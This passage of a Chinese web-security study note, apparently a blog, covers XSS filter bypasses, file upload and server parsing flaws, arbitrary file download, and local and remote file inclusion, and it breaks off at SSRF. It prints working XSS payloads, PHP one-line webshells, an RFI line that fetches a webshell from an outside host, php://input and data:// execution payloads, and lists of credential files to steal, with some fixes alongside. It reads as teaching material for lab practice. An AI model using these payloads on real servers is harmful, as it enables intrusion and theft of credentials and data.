漏洞防御**防御方法01：前端表单限制**    绕过方式01：修改前端页面代码    绕过方法02：利用bp修改请求字段信息**防御方法02：匹配字段信息做过滤（输入）**\$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', \$_GET['message']); \$message=preg_replace('/\<script>/i', '', $\_GET['message']); ​绕过方法01：字母大小混合绕过​123'">\<SCRIPT>alert(123)\</SCRIPT><p>​绕过方法02：字符信息拼凑绕过<br>​&lt;sc&lt;script&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;script&gt;ipt&gt;<br>​绕过方法03：注释干扰后台绕过<br>​&lt;sc&lt;!–test–&gt;ript&gt;alert(‘63252’)&lt;&#x2F;scr&lt;!–tshauie–&gt;ipt&gt;<br>​绕过方法04：代码信息编码绕过</p><p>​&lt;SCRIPT&gt;alert(123)&lt;&#x2F;SCRIPT&gt; – 编码处理 base64  url</p><p>​例：使用事件属性<br>​\img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;<br>​&lt;img src&#x3D;x onerror&#x3D;”&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#121;&#97;&#110;&#103;&#115;&#104;&#117;&#97;&#110;&#103;&#39;&#41;”&#x2F;&gt;<br>​使用HTML进行编码<br>​绕过方法05：更换代码标签绕过<br>​&lt;img src&#x3D;# onerror&#x3D;”alert(‘oldboy’)”&#x2F;&gt;</p><p><strong>防御方法03：利用php函数进行防御（htmlspecialchars()）</strong><br>    绕过方法01：加载不关注引号的攻击代码信息<br>        q’ onclick&#x3D;’alert(111)’</p><p><strong>防御方法04：构建js代码格式进行防御</strong><br>绕过方法01：<br>‘11’&lt;&#x2F;script&gt;&lt;script&gt;alert(1111)&lt;&#x2F;script&gt;</p><p><a href="https://www.fujieace.com/penetration-test/xss-100.html">XSS攻击绕过过滤方法大全（约100种） - 付杰博客</a></p><p>总结：<br>防御：考虑各种绕过情况，一般是需要在输入和输出环节，对传入的字段信息都做处理<br>绕过：需要根据php页面防御代码信息，实现有效绕过</p><h1 id="文件上传下载漏洞"><a href="#文件上传下载漏洞" class="headerlink" title="文件上传下载漏洞"></a>文件上传下载漏洞</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>大多数网站都有文件上传的接口，但如果在后台开发时并没有对上传的文件进行安全考虑或采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件，从而通过该恶意文件的访问来控制整个后台</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><img src="/img/oldboy/image-20250304160544834.png" alt="image-20250304160544834" style="zoom: 80\%;" /><p>在验证上传点是否存在漏洞时，直接上传普通文件，文件名发生了改变极大可能为白名单绕过</p><p><img src="/img/oldboy/image-20250304221013611.png" alt="image-20250304221013611"></p><h3 id="漏洞使用"><a href="#漏洞使用" class="headerlink" title="漏洞使用"></a>漏洞使用</h3><p><img src="/img/oldboy/image-20250304221428832.png" alt="image-20250304221428832"></p><p>1、客户端JavaScript前端检查绕过</p><p>​一般通过查看源代码是否有相关检查</p><ol><li>可以通过bp抓包绕过</li><li>在前端页面禁用JS，直接上传webshell</li></ol><p>2、黑名单限制上传</p><p>​通过限制相关的.php&#x2F;.jsp&#x2F;.asp等后缀</p><ol><li><p>使用未被限制的后缀绕过（如php3、php5需要配置相关配置文件）</p></li><li><p>使用.htaccess文件进行绕过(需要在http.conf文件中开启AllowOverried All )</p><p>如果是windows电脑使用php和windows环境叠加特性</p><p>​双引号”   &#x3D;  点号.</p><p>​大于符号&gt;  &#x3D;  问号?</p><p>​小于符号&lt;  &#x3D;  星号*</p><p>上传后为空文件，需要将文件名改为4.&lt;或4.&lt;&lt;&lt;或4.&gt;&gt;&gt;或4.&gt;&gt;&lt;后再次上传，重写4.php文件内容</p></li><li><p>后缀大小写绕过</p></li><li><p>利用windows特性，增加空格( )和点(.)</p></li><li><p>利用windows特性，使用::$DATA文件流进行绕过</p></li></ol><blockquote><blockquote><p>.htaccess解释：</p><p>​SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。</p><p>通过这个机制可以先上传一个.htaccess文件，然后上传一个正常后缀的文件，相互搭配，实现php解析</p></blockquote></blockquote><p>3、白名单限制上传</p><ol><li>使用上传路径名%00截断(php版本要小于5.3.4，5.3.4及以上已经修复该问题；magic_quotes_gpc需要为OFF状态)</li><li>上传路径0x00绕过</li><li>绕过文件头检查，添加GIF图片的文件头GIF89a</li><li>copy 1.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg合并绕过</li><li>绕过二次渲染，使用图片坚强马</li></ol><p>使用图片马需要搭配文件包含漏洞，才能使用</p><h2 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h2><h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3><p><a href="./%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E.docx">.&#x2F;中间件解析漏洞.docx</a></p><h4 id="目录解析漏洞"><a href="#目录解析漏洞" class="headerlink" title="目录解析漏洞"></a>目录解析漏洞</h4><p>在 <strong>IIS5.x&#x2F;6.0</strong> 中，在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p><h4 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h4><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa  .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 *.asp;.jpg、*.asa;.jpg、*.cer;.jpg 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p><h4 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h4><p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p><p>&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php @eval($_POST[x])?&gt;’)?&gt;</p><p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件 shell.php 。</p><p>临时解决办法：设置 cgi.fix_pathinfo为0</p><h4 id="IIS7-5漏洞解析"><a href="#IIS7-5漏洞解析" class="headerlink" title="IIS7.5漏洞解析"></a>IIS7.5漏洞解析</h4><p>版本IIS7.5</p><p>漏洞产生原因： php.ini里默认cgi.fix_pathinfo&#x3D;1，对其进行访问的时候，在URL路径后添加.php后缀名会当做php文件进行解析</p><p>满足条件：</p><p>​1、php.ini里默认cgi.fix_pathinfo&#x3D;1开启</p><p>​2、设置FastCGI为关闭</p><p>漏洞利用方式：</p><p>​将含有木马的正常文件后缀的文件进行上传，然后使用</p><p><a href="https://www.xp.cn/a.txt/.php">https://www.xp.cn/a.txt/.php</a></p><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>漏洞原理</p><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。</p><p>漏洞形式</p><p><a href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p><p>其余配置问题导致漏洞</p><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application&#x2F;x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p><p>修复方法：</p><p>​1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p><p>​&lt;Files ~ “.(php.|php3.)”&gt;</p><p>​    Order Allow,Deny</p><p>​    Deny from all</p><p>​&lt;&#x2F;Files&gt;</p><p>​2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules&#x2F;mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:</p><p>​<IfModule mod_rewrite.c></p><p>​RewriteEngine On</p><p>​RewriteRule .(php.|php3.) &#x2F;index.php</p><p>​RewriteRule .(pHp.|pHp3.) &#x2F;index.php</p><p>​RewriteRule .(phP.|phP3.) &#x2F;index.php</p><p>​RewriteRule .(Php.|Php3.) &#x2F;index.php</p><p>​RewriteRule .(PHp.|PHp3.) &#x2F;index.php</p><p>​RewriteRule .(PhP.|PhP3.) &#x2F;index.php</p><p>​RewriteRule .(pHP.|pHP3.) &#x2F;index.php</p><p>​RewriteRule .(PHP.|PHP3.) &#x2F;index.php</p><p>​&lt;&#x2F;IfModule&gt;</p><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><p>漏洞原理</p><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA%E2%80%9Cphpinfo.jpg/1.php%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9E%84%E9%80%A0%E6%88%90SCRIPT_FILENAME%E4%BC%A0%E9%80%92%E7%BB%99PHP">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p><p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p><p>漏洞形式</p><p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%00.php">www.xxxx.com/UploadFiles/image/1.jpg\%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg//%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/\%20\0.php</a></p><p>xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</p><p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p><p>&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;‘);?&gt;</p><p>然后访问test.jpg&#x2F;.php,在这个目录下就会生成一句话木马shell.php。</p><p>修复方案</p><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：</p><p>if ( $fastcgi_script_name ~ ..*&#x2F;.*php ) {</p><p>return 403;</p><p>}</p><p>这行代码的意思是当匹配到类似test.jpg&#x2F;a.php的URL时，将返回403错误代码。</p><h2 id="文件下载漏洞"><a href="#文件下载漏洞" class="headerlink" title="文件下载漏洞"></a>文件下载漏洞</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，<br>则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>一般链接形式:<br>download.php?path&#x3D;<br>down.php?file&#x3D;<br>data.php?file&#x3D;<br>download.php?filename&#x3D;</p><p>或者包含参数:<br>&amp;Src&#x3D;<br>&amp;Inputfile&#x3D;<br>&amp;Filepath&#x3D;<br>&amp;Path&#x3D;<br>&amp;Data&#x3D;</p><p>靶场环境应用<br><a href="http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php">http://10.0.0.101:90/pikachu/vul/unsafedownload/down_nba.php</a><br>下载文件链接：<br><a href="http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.0.0.101:90/pikachu/vul/unsafedownload/execdownload.php?filename=kb.png</a></p><p>当遇到一个任意文件下载时，我们的一般利用思路:</p><p>(1)下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</p><p>(2)下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</p><p>(3)下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。<br>   尝试读取&#x2F;root&#x2F;.bash_history看自己是否具有root权限。<br>   如果没有的话。我们只能按部就班的利用..&#x2F;来回跳转读取一些.ssh下的配置信息文件，读取mysql下的.bash_history文件。<br>   来查看是否记录了一些可以利用的相关信息。<br>   然后逐个下载我们需要审计的代码文件，但是下载的时候变得很繁琐，我们只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p><p>如果我们遇到的是java+oracle环境<br>可以先下载&#x2F;WEB-INF&#x2F;classes&#x2F;applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载&#x2F;WEB-INF&#x2F;classes&#x2F;xxx&#x2F;xxx&#x2F;ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器</p><p>如果具有root权限<br>在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db。<br>这个数据库中含有本地所有文件信息。<br>Linux系统自动创建这个数据库，并且每天自动更新一次。<br>当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。</p><p>locate 读取方法: locate mlocate.db admin<br>&#x2F;&#x2F;可以将mlocate.db中包含admin文件名的内容全部输出来</p><p>（4）常见利用文件<br>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;root&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore<br>&#x2F;root&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;记录每个访问计算机用户的公钥<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow<br>&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql配置文件<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache配置文件<br>&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件<br>&#x2F;root&#x2F;.mysql_history &#x2F;&#x2F;mysql历史命令记录文件<br>&#x2F;proc&#x2F;mounts &#x2F;&#x2F;记录系统挂载设备<br>&#x2F;porc&#x2F;config.gz &#x2F;&#x2F;内核配置文件<br>&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db &#x2F;&#x2F;全文件路径<br>&#x2F;porc&#x2F;self&#x2F;cmdline &#x2F;&#x2F;当前进程的cmdline参数</p><h3 id="防御措施-1"><a href="#防御措施-1" class="headerlink" title="防御措施"></a>防御措施</h3><p>（1）过滤”.”，使用户在url中不能回溯上级目录</p><p>（2）正则严格判断用户输入参数的格式</p><p>（3）php.ini配置open_basedir限定文件访问范围</p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>文件包含原理：</p><p>​程序员在开发的时候，未对包含的文件进行严格过滤，攻击者可以构造图片木马文件当作php执行</p><p>漏洞产生原因：</p><p>​在使用include()等函数时，未对包含的文件进行过滤。include()函数会将任意文件的类型，进行PHP代码解析</p><p>包含漏洞分类</p><ul><li>本地包含</li><li>远程包含<ul><li>远程包含需要开启allow_url_include&#x3D;on 、magic_quotes_gpc&#x3D;off</li></ul></li></ul><p>如何快速挖掘文件包含漏洞</p><p>​直接查找源代码里的4个函数</p><p>​include(),include_once(),require(),require_once()</p><p>这2个函数include(),include_once()不重复加载，require()和require_once()遇到错误退出</p><h2 id="本地包含漏洞LFI"><a href="#本地包含漏洞LFI" class="headerlink" title="本地包含漏洞LFI"></a>本地包含漏洞LFI</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>可以通过本地文件包含漏洞打开本地文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">file=\<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">include($</span><span class="language-bash">file);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用此漏洞可以读取一些系统本地的敏感信息。</p><p>(1)使用绝对路径</p><p><a href="http://127.0.0.1/include.php?filename=C:%5Cwindows%5Csystem.ini">http://127.0.0.1/include.php?filename=C:\windows\system.ini</a></p><p>(2)使用相对路径进行读取</p><p>通过.&#x2F;表示当前位置路径，…&#x2F;表示上一级路径位置</p><p><a href="http://127.0.0.1/include.php?filename=../../phpinfo.jpg">http://127.0.0.1/include.php?filename=../../phpinfo.jpg</a></p><p>常用敏感信息路径：</p><p>windows：</p><p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息</p><p>Linux：</p><p>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件</p><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><h4 id="配合文件进行上传"><a href="#配合文件进行上传" class="headerlink" title="配合文件进行上传"></a>配合文件进行上传</h4><p>无法找到文件上传漏洞上传webshell时，可以先通过上传一个图片格式的webshell到web服务器，在利用本地文件包含漏洞进行解析</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[123]);?&gt;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p><h4 id="包含Apache日志文件"><a href="#包含Apache日志文件" class="headerlink" title="包含Apache日志文件"></a>包含Apache日志文件</h4><p>当Apache开启相关日志功能(\logs\access.log)后，通常可以访问URL携带一句话木马，从而写入日志文件中</p><p>利用条件：</p><p>​对文件日志可读</p><p>​知道日志文件存储目录</p><p>注意：一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf…..)或者根据phpinfo()带来的信息来得知</p><p>1、通常情况下，在地址栏构造  <a href="http://192.168.1.55:8080/dvwa/1.php">http://192.168.1.55:8080/dvwa/1.php</a> &lt;?php @eval($_POST[‘hack’]);?&gt;发现日志记录中会将该URL进行编码，无法实现进行连接</p><p>2、需要通过burp抓包，重新构造请求行，进行发送</p><p>3、上传之后使用webshell管理工具进行连接。</p><h2 id="远程文件包含RFI"><a href="#远程文件包含RFI" class="headerlink" title="远程文件包含RFI"></a>远程文件包含RFI</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include&#x2F;require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">path=<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">include($</span><span class="language-bash">path . <span class="string">&#x27;/phpinfo.php&#x27;</span>);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以观察到该页面并没有对$path做任何过滤，因此存在文件包含漏洞。</p><p>我们在远端Web服务器&#x2F;site&#x2F;目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。</p><p>但是代码会给我们输入的路径后面加上’&#x2F;phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。</p><p>还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：<br><img src="/img/oldboy/2ca64d46dc74254f30699d6a5b43fd01.png" alt="在这里插入图片描述"></p><p>如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。</p><blockquote><p>可以通过在本地搭建图片马，然后操控靶机开启allow_url_include、allow_url_fopen参数，通过文件包含漏洞控制访问本机的图片马(例如：<a href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg</a>)</p><p>再通过蚁剑添加<a href="http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg%E4%BB%8E%E8%80%8C%E6%8E%A7%E5%88%B6%E9%9D%B6%E6%9C%BA">http://192.168.0.1/include.php?path=http://10.1.5.4/test.jpg从而控制靶机</a></p></blockquote><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p><img src="/img/oldboy/image-20250306163301204.png" alt="image-20250306163301204"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/cdf1dfdb5bf058cc3c07823f2c9a0cc8.png" alt="在这里插入图片描述"></p><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h3><p><strong>file:&#x2F;&#x2F;</strong> 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9804c2536776aebd3e8f87d6e6ba3170.png" alt="在这里插入图片描述"></p><h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h3><p>php:&#x2F;&#x2F; 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code><br><strong>php:&#x2F;&#x2F;filter用于读取源码</strong>。<br><strong>php:&#x2F;&#x2F;input用于执行php代码</strong>。</p><p><strong>php:&#x2F;&#x2F;filter</strong> 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p><p><strong>利用条件:</strong></p><ul><li>allow_url_fopen ：off&#x2F;on</li><li>allow_url_include：off&#x2F;on</li></ul><p>有特殊字符一定要转化为base64，例如：<a href="http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php">http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php</a></p><p>再进行base64解码，获取到2.php的完整源码信息</p><p><strong>php:&#x2F;&#x2F;input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p><p><strong>利用条件:</strong></p><ul><li>allow_url_fopen ：off&#x2F;on</li><li>allow_url_include：on</li></ul><p>利用该方法，我们可以直接写入php文件，输入<code>file=php://input</code>，然后使用burp抓包，写入php代码：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/77e3a356bb8653fe01cb7f79f577c36a.png" alt="在这里插入图片描述"></p><p>发送报文，可以看到本地生成了一句话木马：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/0fccd0cb7c16e9308cd76529b316a3b2.png" alt="在这里插入图片描述"></p><h3 id="ZIP-协议"><a href="#ZIP-协议" class="headerlink" title="ZIP:&#x2F;&#x2F;协议"></a>ZIP:&#x2F;&#x2F;协议</h3><p>zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</p><p>​zip:&#x2F;&#x2F;中只能传入绝对路径。<br>​要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）<br>​只需要是zip的压缩包即可，后缀名可以任意更改。<br>​相同的类型还有zlib:&#x2F;&#x2F;和bzip2:&#x2F;&#x2F;</p><p><strong>利用条件:</strong></p><ul><li>allow_url_fopen ：off&#x2F;on</li><li>allow_url_include：off&#x2F;on</li></ul><p>POC为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\1.zip\%23phpinfo.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/blog_migrate/012f3ceb1aa9bc1dc885d1ddf13d3212.png" alt="在这里插入图片描述"></p><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h3><p>data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p><p>利用data:&#x2F;&#x2F; 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：<br>利用条件:</p><p>allow_url_fopen ：on<br>allow_url_include：on</p><p>POC为:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="line">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i-blog.csdnimg.cn/blog_migrate/f40ca9293fc6372eb5961de2438b36e8.png" alt="在这里插入图片描述"></p><h2 id="文件包含漏洞防护"><a href="#文件包含漏洞防护" class="headerlink" title="文件包含漏洞防护"></a>文件包含漏洞防护</h2><p>1、使用str_replace等方法过滤掉危险字符</p><p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p><p>3、php版本升级，防止%00截断</p><p>4、对上传的文件进行重命名，防止被读取</p><p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p><p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</p><h1 id="SSRF跨站伪造请求"><a href="#SSRF跨站伪造请求" class="headerlink" title="SSRF跨站伪造请求"></a>SSRF跨站伪造请求</h1><h2 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="SSRF原理"><a href="#SSRF原理" class="headerlink" 